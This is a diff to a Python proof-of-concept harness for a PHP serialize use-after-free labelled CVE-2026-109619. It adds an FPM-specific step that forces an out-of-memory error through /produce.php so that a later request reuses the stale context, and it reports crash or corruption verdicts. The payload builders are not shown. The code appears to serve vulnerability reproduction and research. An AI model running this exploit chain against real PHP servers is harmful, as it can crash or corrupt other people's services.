@@ -226,6 +226,16 @@ def post(
         conn.close()
 
 
+def get(port: int, path: str, timeout: int = 30) -> tuple[int, bytes]:
+    conn = http.client.HTTPConnection(HOST, port, timeout=timeout)
+    try:
+        conn.request("GET", path)
+        res = conn.getresponse()
+        return res.status, res.read()
+    finally:
+        conn.close()
+
+
 def post_chunked(
     port: int, chunks: list[bytes], path: str, timeout: int = 120
 ) -> tuple[int, bytes]:
@@ -273,19 +283,29 @@ def chain_109619(php: str, control: bool = False, timeout: int = 30, sapi: str =
 
     sid = secrets.token_hex(16)
     filename_len = 2000 if control else 2_000_000
-    try:
-        st1, _ = post(port, arm_body(sid, filename_len), "/probe.php", sid=sid)
-        r1 = str(st1)
-    except (OSError, http.client.HTTPException) as exc:
-        r1 = f"error ({type(exc).__name__})"
+    r1 = "skipped (fpm uses the app-level producer)"
+    if sapi == "cli":
+        try:
+            st1, _ = post(port, arm_body(sid, filename_len), "/probe.php", sid=sid)
+            r1 = str(st1)
+        except (OSError, http.client.HTTPException) as exc:
+            r1 = f"error ({type(exc).__name__})"
 
-    # For FPM the master survives and respawns the child, so check whether the
-    # arm request itself killed the child before the fire request arrives.
-    arm_killed = False
     if sapi == "fpm":
+        # The FPM producer runs in application execution, not in request
+        # startup: an app-level OOM inside serialize() leaves BG(serialize)
+        # dangling while the child survives. The consumer is the next
+        # request's pre-RINIT upload-progress encode.
+        try:
+            st0, body0 = get(port, "/produce.php", timeout=timeout)
+            produced = f"{st0} ({'OOM' if b'Allowed memory size' in body0 else 'no OOM'})"
+        except (OSError, http.client.HTTPException) as exc:
+            produced = f"error ({type(exc).__name__})"
         time.sleep(0.3)
         arm_log = logs(service, 20)
         arm_killed = "exited with code" in arm_log or "exited on signal" in arm_log
+    else:
+        produced = f"R1 {r1}"
 
     died = False
     try:
@@ -305,9 +325,11 @@ def chain_109619(php: str, control: bool = False, timeout: int = 30, sapi: str =
         fired = died or not alive or corrupt
 
     print(f"[*] CVE-2026-109619 PHP {php} sapi={sapi}{' (control)' if control else ''}")
-    print(f"    R1 arm   {r1}  filename={filename_len} bytes, memory_limit=8M")
     if sapi == "fpm":
-        print(f"    arm      {'child died (FPM respawned it)' if arm_killed else 'child survived'}")
+        print(f"    produce  {produced}")
+        print(f"    child    {'died' if arm_killed else 'survived the app-level OOM'}")
+    else:
+        print(f"    R1 arm   {r1}  filename={filename_len} bytes, memory_limit=8M")
     print(f"    R2 fire  {r2}")
     if sapi == "fpm":
         state = "child died" if (fired or arm_killed) else ("alive" if alive else "dead")
@@ -317,7 +339,7 @@ def chain_109619(php: str, control: bool = False, timeout: int = 30, sapi: str =
     for line in [ln for ln in log.splitlines() if "corrupt" in ln or "Fatal" in ln][-3:]:
         print(f"    log      {line.strip()}")
     if sapi == "fpm" and arm_killed:
-        print("    verdict  NO REUSE — child died during the arm request; FPM respawned it")
+        print("    verdict  NO REUSE — child died before the consumer request")
         return 3
     print(f"    verdict  {'FIRED — stale serialize context reused' if fired else 'SURVIVED'}")
     return 0 if fired else 1
